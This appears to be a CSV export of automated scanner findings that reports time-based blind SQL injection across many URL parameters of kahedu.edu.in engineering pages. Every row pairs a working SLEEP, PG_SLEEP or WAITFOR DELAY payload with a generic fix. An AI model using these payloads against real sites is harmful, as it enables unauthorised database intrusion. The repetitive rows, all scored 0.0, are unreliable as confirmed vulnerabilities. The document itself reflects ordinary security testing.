Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/electronics-communication-engineering/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
